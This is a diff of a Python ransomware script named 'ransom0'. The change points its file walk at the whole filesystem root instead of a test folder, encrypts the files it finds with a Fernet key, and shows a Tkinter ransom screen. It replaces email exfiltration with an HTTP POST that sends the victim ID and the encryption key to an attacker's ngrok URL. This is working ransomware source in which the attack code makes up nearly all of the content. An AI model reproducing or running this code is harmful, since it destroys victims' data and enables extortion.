@@ -1,34 +1,26 @@
-import os, platform, smtplib, ssl, socket, shutil, time
+import os, platform, ssl, shutil, time, requests
+from datetime import datetime
 from os import system, name, path
 from cryptography.fernet import Fernet
-from datetime import datetime
-from requests import get
 from cryptography.fernet import Fernet
 import tkinter as tk
-import shutil, os
 from tkinter import *
 from random import randint
 
 
 digits = randint(1111,9999) 
+key = Fernet.generate_key()
+
+url = '' # PUT THE URL YOU GOT FROM NGROK HERE
 
 
 class ransom0:
-    key = Fernet.generate_key()
+
     username = os.getlogin()
-    time_now = datetime.now().time()
-    hostname = socket.gethostname()
     PATH = os.getcwd()
 
 
-    # Email Settings
-    port = 587  
-    smtp_server = "" # Enter the smtp server of your email provider
-    sender_email = ""  # Enter your address
-    receiver_email = ""  # Enter receiver address
-    password = "" # your email password
-
-    EXCLUDE_DIRECTORY = ('/usr', #Mac/Linux system directory
+    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                             '/Library/',
                             '/System',
                             '/Applications',
@@ -75,7 +67,8 @@ class ransom0:
     def FindFiles(self):
         f = open("logs/path.txt", "w")
         cnt = 0
-        for root, dirs, files in os.walk("/Users/hugolb/Documents/Productivity/Pentesting/Ransomware/test_directory"):
+        for root, dirs, files in os.walk("/"):
+            #for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):
             if any(s in root for s in self.EXCLUDE_DIRECTORY):
                 pass
             else:
@@ -91,7 +84,7 @@ class ransom0:
         f.close()
 
     def Encrypt(self, filename):
-        f = Fernet(self.key)
+        f = Fernet(key)
         with open(filename, "rb") as file:
             file_data = file.read()
         encrypted_data = f.encrypt(file_data)
@@ -99,25 +92,13 @@ class ransom0:
             file.write(encrypted_data)
         print(filename)
 
-    def SendData(self):
-        DataSend = ("""
-        time: {}
-        IP: {}
-        Hostname: {}
-        username: {}
-        id: {}
-        key: {}
-        """).format(self.time_now, self.IP, self.hostname, self.username, str(digits), str(self.key))
-        print("Sending Data")
-        context = ssl.create_default_context()
-        with smtplib.SMTP(self.smtp_server, self.port) as server:
-            server.ehlo()  # Can be omitted
-            server.starttls(context=context)
-            server.ehlo()  # Can be omitted
-            server.login(self.sender_email, self.password)
-            server.sendmail(self.sender_email, self.receiver_email, DataSend)
+def SendData(decrypted): 
+    now = datetime.now()
+    date = now.strftime("%d/%m/%Y %H:%M:%S")
 
+    data = f'[{digits}, {key}, "{date}", "{decrypted}"]'
 
+    requests.post(url, data)
 
 ransom0 = ransom0()
 
@@ -136,6 +117,7 @@ def StartRansom():
                     pass
                 line = fp.readline()
         fp.close()
+        SendData('false')
     except FileNotFoundError:
         os.mkdir("logs")
         f = open("logs/digits.txt", "w")
@@ -143,8 +125,8 @@ def StartRansom():
         f.close()
         StartRansom()
 
+
 StartRansom()
-#ransom0.SendData()
 
 PATH = os.getcwd()
 
@@ -200,18 +182,18 @@ def DECRYPT_FILE():
     canvas1.create_window(int(width/2), int(height/20)*12, window=entry1)
 
 
-
-
-    def decrypt(filename):
-        key = entry1.get()
-        f = Fernet(key)
-        with open(filename, "rb") as file:
-            encrypted_data = file.read()
-        decrypted_data = f.decrypt(encrypted_data)
-        with open(filename, "wb") as file:
-            file.write(decrypted_data)
-
     def DECRYPT_FILE():
+
+        def decrypt(filename):
+            key = entry1.get()
+            f = Fernet(key)
+            with open(filename, "rb") as file:
+                encrypted_data = file.read()
+            decrypted_data = f.decrypt(encrypted_data)
+            with open(filename, "wb") as file:
+                file.write(decrypted_data)
+
+
         with open('logs/path.txt') as fp:
             line = fp.readline()
             while line:
@@ -222,14 +204,12 @@ def DECRYPT_FILE():
                     print("!Permission Denied")
                     pass
                 line = fp.readline()
-        fp.close()
-
         label1 = tk.Label(root, text='YOUR FILES HAVE BEEN DECRYPTED') # Title
         label1.config(font=('helvetica', int(height/50)))
         label1.config(background='black', foreground='red')
         canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
+        fp.close()
         shutil.rmtree(PATH+'/logs', ignore_errors=True)
-
 
         canvas1.create_window(int(width/2), 340, window=label1)  
 
@@ -239,6 +219,9 @@ def DECRYPT_FILE():
     canvas1.create_window(int(width/2), int(height/20)*13, window=button1)
 
     root.mainloop()
+
+    SendData('true')
+
 
 
 
